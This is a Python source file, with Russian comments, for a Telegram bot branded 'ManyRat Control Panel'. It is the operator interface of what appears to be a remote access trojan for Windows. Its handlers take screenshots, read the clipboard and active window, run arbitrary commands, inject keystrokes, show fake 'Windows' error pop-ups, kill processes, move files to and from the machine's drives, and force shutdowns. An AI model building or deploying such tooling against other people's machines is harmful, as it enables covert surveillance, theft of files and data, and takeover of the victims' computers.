import os

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
)

import actions
from config import OWNER_ID, TOKEN

# ─── Состояния ConversationHandler ─────────────────────────────────────────────
(
    WAIT_RUN,
    WAIT_TYPE,
    WAIT_TYPE_ENTER,
    WAIT_MSG,
    WAIT_KILL,
    WAIT_PS,
    WAIT_VOLUME,
    WAIT_HOTKEY,
    WAIT_FILE_UPLOAD,
) = range(9)

OWNER_FILTER = filters.User(user_id=OWNER_ID)


# ─── Клавиатуры ────────────────────────────────────────────────────────────────

def kb_main():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🖥 Система",   callback_data="menu_system"),
         InlineKeyboardButton("⚙️ Действия",  callback_data="menu_actions")],
        [InlineKeyboardButton("🔊 Звук",      callback_data="menu_sound"),
         InlineKeyboardButton("🔒 Питание",   callback_data="menu_power")],
        [InlineKeyboardButton("📁 Файлы",     callback_data="menu_files"),
         InlineKeyboardButton("🌐 Сеть",      callback_data="menu_network")],
        [InlineKeyboardButton("📋 Мониторинг", callback_data="menu_monitor")],
    ])


def kb_system():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📜 Нагрузка",        callback_data="sys_info")],
        [InlineKeyboardButton("📊 Процессы",         callback_data="sys_ps")],
        [InlineKeyboardButton("🖼 Скриншот",         callback_data="sys_screen")],
        [InlineKeyboardButton("❌ Убить процесс",    callback_data="sys_kill")],
        [InlineKeyboardButton("🪟 Активное окно",    callback_data="sys_active_win")],
        [InlineKeyboardButton("📋 Буфер обмена",     callback_data="sys_clipboard")],
        [InlineKeyboardButton("⬅️ Назад",            callback_data="back_main")],
    ])


def kb_actions():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 Запустить прогу",    callback_data="act_run")],
        [InlineKeyboardButton("⌨️ Ввести текст",       callback_data="act_type")],
        [InlineKeyboardButton("↩️ Ввести + Enter",     callback_data="act_type_enter")],
        [InlineKeyboardButton("⚠️ Окошко с ошибкой",  callback_data="act_msg")],
        [InlineKeyboardButton("⌨️ Горячая клавиша",   callback_data="act_hotkey")],
        [InlineKeyboardButton("🔀 Alt+Tab",            callback_data="act_alttab")],
        [InlineKeyboardButton("⬅️ Назад",              callback_data="back_main")],
    ])


def kb_sound():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔉 Установить громкость", callback_data="snd_set")],
        [InlineKeyboardButton("🔇 Выключить звук",       callback_data="snd_mute")],
        [InlineKeyboardButton("🔊 Включить звук",        callback_data="snd_unmute")],
        [InlineKeyboardButton("⬅️ Назад",                callback_data="back_main")],
    ])


def kb_power():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔒 Заблокировать",   callback_data="pwr_lock")],
        [InlineKeyboardButton("💤 Спящий режим",    callback_data="pwr_sleep")],
        [InlineKeyboardButton("🔄 Перезагрузка",    callback_data="pwr_reboot")],
        [InlineKeyboardButton("⏻ Выключение",       callback_data="pwr_shutdown")],
        [InlineKeyboardButton("❌ Отмена действия", callback_data="pwr_cancel")],
        [InlineKeyboardButton("⬅️ Назад",           callback_data="back_main")],
    ])


def kb_network():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🌍 Мой IP",             callback_data="net_ip")],
        [InlineKeyboardButton("🔌 Интерфейсы",         callback_data="net_ifaces")],
        [InlineKeyboardButton("🔗 Активные соединения", callback_data="net_conns")],
        [InlineKeyboardButton("⬅️ Назад",              callback_data="back_main")],
    ])


def kb_monitor():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📋 Топ процессов",  callback_data="mon_top")],
        [InlineKeyboardButton("⬅️ Назад",          callback_data="back_main")],
    ])


def kb_cancel():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("❌ Отмена", callback_data="cancel_input")],
    ])


def kb_files_drives(drives):
    """Клавиатура с дисками."""
    rows = []
    for line in drives:
        drive = line.split("\\")[0] + "\\"  # "C:\\"
        rows.append([InlineKeyboardButton(f"💾 {line}", callback_data=f"file_cd:{drive}")])
    rows.append([InlineKeyboardButton("⬅️ Назад", callback_data="back_main")])
    return InlineKeyboardMarkup(rows)


def kb_files_dir(path, dirs, files):
    """Клавиатура для навигации по папке."""
    rows = []
    # папки (до 20)
    for d in dirs[:20]:
        sub = os.path.join(path, d)
        rows.append([InlineKeyboardButton(f"📂 {d}", callback_data=f"file_cd:{sub}")])
    # файлы (до 15)
    for fname, size in files[:15]:
        fpath = os.path.join(path, fname)
        rows.append([InlineKeyboardButton(f"📄 {fname}  ({size})", callback_data=f"file_get:{fpath}")])
    # навигация
    nav = []
    parent = os.path.dirname(path.rstrip("\\/"))
    if parent and parent != path:
        nav.append(InlineKeyboardButton("⬆️ Вверх", callback_data=f"file_cd:{parent}"))
    nav.append(InlineKeyboardButton("🏠 Диски", callback_data="menu_files"))
    rows.append(nav)
    rows.append([InlineKeyboardButton("📤 Загрузить файл сюда", callback_data=f"file_upload:{path}")])
    rows.append([InlineKeyboardButton("⬅️ Меню", callback_data="back_main")])
    return InlineKeyboardMarkup(rows)


# ─── Вспомогалки ───────────────────────────────────────────────────────────────

MAIN_TEXT = (
    "🛰 <b>ManyRat Control Panel</b>\n\n"
    "Система на связи. Вы находитесь в главном меню управления.\n"
    "Используйте интерактивное меню ниже для выбора нужной функции."
)
SUBMENU_TEXT = "Активируйте необходимую кнопку для выбора необходимой вам функции."


async def show_main(update: Update, text: str | None = None):
    msg_text = text or MAIN_TEXT
    query = update.callback_query
    if query:
        msg = query.message
        if msg.photo or msg.document or msg.video or msg.audio:
            await msg.delete()
            await msg.chat.send_message(msg_text, reply_markup=kb_main(), parse_mode="HTML")
        else:
            await query.edit_message_text(msg_text, reply_markup=kb_main(), parse_mode="HTML")
    else:
        await update.message.reply_text(msg_text, reply_markup=kb_main(), parse_mode="HTML")


async def show_submenu(query, text: str, keyboard):
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode="HTML")


# ─── /start ────────────────────────────────────────────────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await show_main(update)
    return ConversationHandler.END


# ─── Навигация ─────────────────────────────────────────────────────────────────

async def nav_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "back_main":
        await show_main(update)
        return ConversationHandler.END
    if data == "menu_system":
        await show_submenu(query, f"<b>🖥 Система</b>\n\n{SUBMENU_TEXT}", kb_system())
    elif data == "menu_actions":
        await show_submenu(query, f"<b>⚙️ Действия</b>\n\n{SUBMENU_TEXT}", kb_actions())
    elif data == "menu_sound":
        await show_submenu(query, f"<b>🔊 Звук</b>\n\n{SUBMENU_TEXT}", kb_sound())
    elif data == "menu_power":
        await show_submenu(query, f"<b>🔒 Питание</b>\n\n{SUBMENU_TEXT}", kb_power())
    elif data == "menu_network":
        await show_submenu(query, f"<b>🌐 Сеть</b>\n\n{SUBMENU_TEXT}", kb_network())
    elif data == "menu_monitor":
        await show_submenu(query, f"<b>📋 Мониторинг</b>\n\n{SUBMENU_TEXT}", kb_monitor())
    elif data == "menu_files":
        drives = actions.list_drives()
        await show_submenu(
            query,
            "<b>📁 Файлы — Этот компьютер</b>\n\nВыберите диск:",
            kb_files_drives(drives),
        )
    return ConversationHandler.END


# ─── Система ───────────────────────────────────────────────────────────────────

async def sys_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    info = actions.system_info()
    await query.edit_message_text(
        f"<b>📜 Нагрузка системы</b>\n\n<pre>{info}</pre>",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("🔄 Обновить", callback_data="sys_info"),
            InlineKeyboardButton("⬅️ Назад",    callback_data="menu_system"),
        ]]),
        parse_mode="HTML",
    )


async def sys_screen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer("Делаю скриншот…")
    buffer = actions.take_screenshot()
    await query.message.reply_photo(
        buffer,
        caption="🖼 Скриншот экрана",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("📸 Ещё", callback_data="sys_screen"),
            InlineKeyboardButton("⬅️ Меню", callback_data="back_main"),
        ]]),
    )


async def sys_active_win(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    title = actions.active_window_title()
    await query.edit_message_text(
        f"<b>🪟 Активное окно</b>\n\n<code>{title}</code>",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("🔄 Обновить", callback_data="sys_active_win"),
            InlineKeyboardButton("⬅️ Назад",    callback_data="menu_system"),
        ]]),
        parse_mode="HTML",
    )


async def sys_clipboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    content = actions.clipboard_get()
    preview = content[:800]
    await query.edit_message_text(
        f"<b>📋 Буфер обмена</b>\n\n<pre>{preview}</pre>",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("🔄 Обновить", callback_data="sys_clipboard"),
            InlineKeyboardButton("⬅️ Назад",    callback_data="menu_system"),
        ]]),
        parse_mode="HTML",
    )


async def sys_ps_ask(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "📊 <b>Процессы</b>\n\nВведите фильтр (часть имени) или <code>.</code> для всех:",
        reply_markup=kb_cancel(), parse_mode="HTML",
    )
    return WAIT_PS


async def sys_ps_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    query_str = "" if text == "." else text
    result = actions.list_processes(query_str)
    await update.message.reply_text(
        f"📊 <b>Список процессов:</b>\n<pre>{result[:3800]}</pre>",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("⬅️ Назад", callback_data="menu_system"),
        ]]),
        parse_mode="HTML",
    )
    return ConversationHandler.END


async def sys_kill_ask(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "❌ <b>Убить процесс</b>\n\nВведите PID или имя процесса:",
        reply_markup=kb_cancel(), parse_mode="HTML",
    )
    return WAIT_KILL


async def sys_kill_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target = update.message.text.strip()
    count = actions.kill_process(target)
    text = f"✅ Убито процессов: {count}" if count else "⚠️ Не найдено или нет доступа"
    await update.message.reply_text(
        text,
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("⬅️ Назад", callback_data="menu_system"),
        ]]),
    )
    return ConversationHandler.END


# ─── Действия ──────────────────────────────────────────────────────────────────

async def act_run_ask(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "🚀 <b>Запустить программу</b>\n\nВведите имя программы или команду:",
        reply_markup=kb_cancel(), parse_mode="HTML",
    )
    return WAIT_RUN


async def act_run_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    command = update.message.text.strip()
    try:
        actions.run_command(command)
        text = "✅ Запущено"
    except Exception as e:
        text = f"❌ Ошибка: {e}"
    await update.message.reply_text(
        text,
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("⬅️ Назад", callback_data="menu_actions"),
        ]]),
    )
    return ConversationHandler.END


async def act_type_ask(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "⌨️ <b>Ввести текст</b>\n\nВведите текст для печати в активном окне:",
        reply_markup=kb_cancel(), parse_mode="HTML",
    )
    return WAIT_TYPE


async def act_type_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    actions.type_text(update.message.text)
    await update.message.reply_text(
        "✅ Текст вписан",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("⬅️ Назад", callback_data="menu_actions"),
        ]]),
    )
    return ConversationHandler.END


async def act_type_enter_ask(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "↩️ <b>Ввести текст + Enter</b>\n\nВведите текст (будет нажат Enter):",
        reply_markup=kb_cancel(), parse_mode="HTML",
    )
    return WAIT_TYPE_ENTER


async def act_type_enter_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    actions.type_text(update.message.text, press_enter=True)
    await update.message.reply_text(
        "✅ Текст вписан и отправлен",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("⬅️ Назад", callback_data="menu_actions"),
        ]]),
    )
    return ConversationHandler.END


async def act_msg_ask(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "⚠️ <b>Окошко с ошибкой</b>\n\nФормат: <code>Имя|текст</code>\n"
        "Пример: <code>Windows|Не удалось найти файл</code>",
        reply_markup=kb_cancel(), parse_mode="HTML",
    )
    return WAIT_MSG


async def act_msg_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    raw = update.message.text.strip()
    if "|" not in raw:
        await update.message.reply_text(
            "❌ Неверный формат. Пример: <code>Windows|Не удалось найти файл</code>",
            reply_markup=kb_cancel(), parse_mode="HTML",
        )
        return WAIT_MSG
    title, text = raw.split("|", 1)
    title, text = title.strip(), text.strip()
    if not title or not text:
        await update.message.reply_text(
            "❌ Имя и текст не могут быть пустыми",
            reply_markup=kb_cancel(), parse_mode="HTML",
        )
        return WAIT_MSG
    actions.show_message(title, text)
    await update.message.reply_text(
        "✅ Окошко показано",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("⬅️ Назад", callback_data="menu_actions"),
        ]]),
    )
    return ConversationHandler.END


async def act_hotkey_ask(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "⌨️ <b>Горячая клавиша</b>\n\n"
        "Введите комбинацию через <code>+</code>:\n"
        "Примеры: <code>win+l</code>, <code>alt+f4</code>, <code>ctrl+shift+esc</code>",
        reply_markup=kb_cancel(), parse_mode="HTML",
    )
    return WAIT_HOTKEY


async def act_hotkey_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keys = update.message.text.strip()
    try:
        actions.hotkey(keys)
        text = f"✅ Нажато: <code>{keys}</code>"
    except Exception as e:
        text = f"❌ Ошибка: {e}"
    await update.message.reply_text(
        text,
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("⬅️ Назад", callback_data="menu_actions"),
        ]]),
        parse_mode="HTML",
    )
    return ConversationHandler.END


async def act_alttab(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    actions.switch_tab()
    await query.edit_message_text(
        "🔀 <b>Alt+Tab нажат</b>",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("🔀 Ещё раз", callback_data="act_alttab"),
            InlineKeyboardButton("⬅️ Назад",   callback_data="menu_actions"),
        ]]),
        parse_mode="HTML",
    )


# ─── Звук ──────────────────────────────────────────────────────────────────────

async def snd_set_ask(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    current = actions.get_volume()
    await query.edit_message_text(
        f"🔉 <b>Установить громкость</b>\n\nТекущая: <b>{current}%</b>\n\nВведите число от 0 до 100:",
        reply_markup=kb_cancel(), parse_mode="HTML",
    )
    return WAIT_VOLUME


async def snd_set_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if not text.isdigit():
        await update.message.reply_text("❌ Введите число от 0 до 100", reply_markup=kb_cancel())
        return WAIT_VOLUME
    value = actions.set_volume(int(text))
    await update.message.reply_text(
        f"✅ Громкость установлена: <b>{value}%</b>",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("⬅️ Назад", callback_data="menu_sound"),
        ]]),
        parse_mode="HTML",
    )
    return ConversationHandler.END


async def snd_mute(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    actions.set_mute(True)
    await query.edit_message_text(
        "🔇 <b>Звук был выключен</b>",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("⬅️ Назад", callback_data="menu_sound"),
        ]]),
        parse_mode="HTML",
    )


async def snd_unmute(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    actions.set_mute(False)
    await query.edit_message_text(
        "🔊 <b>Звук был включён</b>",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("⬅️ Назад", callback_data="menu_sound"),
        ]]),
        parse_mode="HTML",
    )


# ─── Питание ───────────────────────────────────────────────────────────────────

async def pwr_lock(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    actions.lock()
    await query.edit_message_text(
        "🔒 <b>Компьютер заблокирован</b>",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("⬅️ Назад", callback_data="menu_power"),
        ]]),
        parse_mode="HTML",
    )


async def pwr_sleep(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "💤 <b>Компьютер войдёт в спящий режим через 5 секунд</b>",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("⬅️ Назад", callback_data="menu_power"),
        ]]),
        parse_mode="HTML",
    )
    actions.sleep()


async def pwr_reboot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    actions.reboot()
    await query.edit_message_text(
        "🔄 <b>Компьютер будет перезагружен через 5 секунд</b>",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("❌ Отменить", callback_data="pwr_cancel"),
        ]]),
        parse_mode="HTML",
    )


async def pwr_shutdown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    actions.shutdown()
    await query.edit_message_text(
        "⏻ <b>Компьютер будет выключен через 5 секунд</b>",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("❌ Отменить", callback_data="pwr_cancel"),
        ]]),
        parse_mode="HTML",
    )


async def pwr_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    actions.cancel_shutdown()
    await query.edit_message_text(
        "❌ <b>Действие было отменено</b>",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("⬅️ Назад", callback_data="menu_power"),
        ]]),
        parse_mode="HTML",
    )


# ─── Файлы ─────────────────────────────────────────────────────────────────────

async def files_browse(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка file_cd: и file_get: колбэков."""
    query = update.callback_query
    await query.answer()
    data = query.data

    if data.startswith("file_cd:"):
        path = data[len("file_cd:"):]
        dirs, files = actions.list_dir(path)
        total = len(dirs) + len(files)
        text = (
            f"<b>📂 {path}</b>\n\n"
            f"Папок: {len(dirs)}  |  Файлов: {len(files)}"
        )
        if total == 0:
            text += "\n\n<i>(папка пуста)</i>"
        await query.edit_message_text(
            text,
            reply_markup=kb_files_dir(path, dirs, files),
            parse_mode="HTML",
        )

    elif data.startswith("file_get:"):
        path = data[len("file_get:"):]
        file_size = os.path.getsize(path)
        if file_size > 50 * 1024 * 1024:  # 50 MB лимит Telegram
            await query.edit_message_text(
                f"❌ Файл слишком большой ({file_size // 1024 // 1024} MB). Telegram лимит — 50 MB.",
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("⬅️ Назад", callback_data=f"file_cd:{os.path.dirname(path)}"),
                ]]),
                parse_mode="HTML",
            )
            return
        await query.answer("Отправляю файл…")
        buf = actions.get_file(path)
        await query.message.reply_document(
            buf,
            filename=os.path.basename(path),
            caption=f"📄 <code>{path}</code>",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("⬅️ Назад", callback_data=f"file_cd:{os.path.dirname(path)}"),
            ]]),
            parse_mode="HTML",
        )

    elif data.startswith("file_upload:"):
        path = data[len("file_upload:"):]
        context.user_data["upload_path"] = path
        await query.edit_message_text(
            f"📤 <b>Загрузка файла</b>\n\nОтправьте файл — он будет сохранён в:\n<code>{path}</code>",
            reply_markup=kb_cancel(),
            parse_mode="HTML",
        )
        return WAIT_FILE_UPLOAD


async def files_receive_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc:
        await update.message.reply_text(
            "❌ Отправьте файл (документ), не фото/текст",
            reply_markup=kb_cancel(),
        )
        return WAIT_FILE_UPLOAD

    dest_dir = context.user_data.get("upload_path", "C:\\")
    dest_path = os.path.join(dest_dir, doc.file_name)
    tg_file = await doc.get_file()
    data = await tg_file.download_as_bytearray()
    actions.save_file(dest_path, bytes(data))
    await update.message.reply_text(
        f"✅ Файл сохранён:\n<code>{dest_path}</code>",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("📂 Открыть папку", callback_data=f"file_cd:{dest_dir}"),
            InlineKeyboardButton("⬅️ Меню", callback_data="back_main"),
        ]]),
        parse_mode="HTML",
    )
    return ConversationHandler.END


# ─── Сеть ──────────────────────────────────────────────────────────────────────

async def net_ip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    ip = actions.get_external_ip()
    await query.edit_message_text(
        f"<b>🌍 IP-адрес</b>\n\n<code>{ip}</code>",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("🔄 Обновить", callback_data="net_ip"),
            InlineKeyboardButton("⬅️ Назад",    callback_data="menu_network"),
        ]]),
        parse_mode="HTML",
    )


async def net_ifaces(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    lines = actions.get_network_interfaces()
    text = "\n".join(lines)
    await query.edit_message_text(
        f"<b>🔌 Сетевые интерфейсы</b>\n\n<pre>{text}</pre>",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("🔄 Обновить", callback_data="net_ifaces"),
            InlineKeyboardButton("⬅️ Назад",    callback_data="menu_network"),
        ]]),
        parse_mode="HTML",
    )


async def net_conns(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    lines = actions.get_connections()
    text = "\n".join(lines)[:3500]
    await query.edit_message_text(
        f"<b>🔗 Активные соединения</b>\n\n<pre>{text}</pre>",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("🔄 Обновить", callback_data="net_conns"),
            InlineKeyboardButton("⬅️ Назад",    callback_data="menu_network"),
        ]]),
        parse_mode="HTML",
    )


# ─── Мониторинг ────────────────────────────────────────────────────────────────

async def mon_top(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    # Первый вызов cpu_percent даёт 0, делаем два прохода
    for proc in __import__("psutil").process_iter(["cpu_percent"]):
        try:
            proc.cpu_percent()
        except Exception:
            pass
    import asyncio
    await asyncio.sleep(1)
    table = actions.top_processes(15)
    await query.edit_message_text(
        f"<b>📋 Топ процессов</b>\n\n<pre>{table}</pre>",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("🔄 Обновить", callback_data="mon_top"),
            InlineKeyboardButton("⬅️ Назад",    callback_data="menu_monitor"),
        ]]),
        parse_mode="HTML",
    )


# ─── Отмена ввода ──────────────────────────────────────────────────────────────

async def cancel_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await show_main(update)
    return ConversationHandler.END


# ─── Запуск ────────────────────────────────────────────────────────────────────

def main():
    app = Application.builder().token(TOKEN).build()
    owner = OWNER_FILTER

    conv = ConversationHandler(
        entry_points=[
            # Система
            CallbackQueryHandler(sys_ps_ask,         pattern="^sys_ps$"),
            CallbackQueryHandler(sys_kill_ask,       pattern="^sys_kill$"),
            # Действия
            CallbackQueryHandler(act_run_ask,        pattern="^act_run$"),
            CallbackQueryHandler(act_type_ask,       pattern="^act_type$"),
            CallbackQueryHandler(act_type_enter_ask, pattern="^act_type_enter$"),
            CallbackQueryHandler(act_msg_ask,        pattern="^act_msg$"),
            CallbackQueryHandler(act_hotkey_ask,     pattern="^act_hotkey$"),
            # Звук
            CallbackQueryHandler(snd_set_ask,        pattern="^snd_set$"),
            # Файлы — upload
            CallbackQueryHandler(files_browse,       pattern="^file_upload:"),
        ],
        states={
            WAIT_PS:          [MessageHandler(filters.TEXT & ~filters.COMMAND, sys_ps_receive)],
            WAIT_KILL:        [MessageHandler(filters.TEXT & ~filters.COMMAND, sys_kill_receive)],
            WAIT_RUN:         [MessageHandler(filters.TEXT & ~filters.COMMAND, act_run_receive)],
            WAIT_TYPE:        [MessageHandler(filters.TEXT & ~filters.COMMAND, act_type_receive)],
            WAIT_TYPE_ENTER:  [MessageHandler(filters.TEXT & ~filters.COMMAND, act_type_enter_receive)],
            WAIT_MSG:         [MessageHandler(filters.TEXT & ~filters.COMMAND, act_msg_receive)],
            WAIT_VOLUME:      [MessageHandler(filters.TEXT & ~filters.COMMAND, snd_set_receive)],
            WAIT_HOTKEY:      [MessageHandler(filters.TEXT & ~filters.COMMAND, act_hotkey_receive)],
            WAIT_FILE_UPLOAD: [MessageHandler(filters.Document.ALL, files_receive_upload)],
        },
        fallbacks=[
            CallbackQueryHandler(cancel_input, pattern="^cancel_input$"),
            CommandHandler("start", start, filters=owner),
        ],
        per_user=True,
        per_chat=True,
    )

    app.add_handler(CommandHandler(["start", "help"], start, filters=owner))
    app.add_handler(conv)

    # Навигация
    nav_pattern = (
        "^(back_main|menu_system|menu_actions|menu_sound|menu_power"
        "|menu_files|menu_network|menu_monitor)$"
    )
    app.add_handler(CallbackQueryHandler(nav_callback,    pattern=nav_pattern))

    # Система
    app.add_handler(CallbackQueryHandler(sys_info,        pattern="^sys_info$"))
    app.add_handler(CallbackQueryHandler(sys_screen,      pattern="^sys_screen$"))
    app.add_handler(CallbackQueryHandler(sys_active_win,  pattern="^sys_active_win$"))
    app.add_handler(CallbackQueryHandler(sys_clipboard,   pattern="^sys_clipboard$"))

    # Действия
    app.add_handler(CallbackQueryHandler(act_alttab,      pattern="^act_alttab$"))

    # Звук
    app.add_handler(CallbackQueryHandler(snd_mute,        pattern="^snd_mute$"))
    app.add_handler(CallbackQueryHandler(snd_unmute,      pattern="^snd_unmute$"))

    # Питание
    app.add_handler(CallbackQueryHandler(pwr_lock,        pattern="^pwr_lock$"))
    app.add_handler(CallbackQueryHandler(pwr_sleep,       pattern="^pwr_sleep$"))
    app.add_handler(CallbackQueryHandler(pwr_reboot,      pattern="^pwr_reboot$"))
    app.add_handler(CallbackQueryHandler(pwr_shutdown,    pattern="^pwr_shutdown$"))
    app.add_handler(CallbackQueryHandler(pwr_cancel,      pattern="^pwr_cancel$"))

    # Файлы
    app.add_handler(CallbackQueryHandler(files_browse,    pattern="^file_(cd|get):"))

    # Сеть
    app.add_handler(CallbackQueryHandler(net_ip,          pattern="^net_ip$"))
    app.add_handler(CallbackQueryHandler(net_ifaces,      pattern="^net_ifaces$"))
    app.add_handler(CallbackQueryHandler(net_conns,       pattern="^net_conns$"))

    # Мониторинг
    app.add_handler(CallbackQueryHandler(mon_top,         pattern="^mon_top$"))

    app.run_polling()


if __name__ == "__main__":
    main()
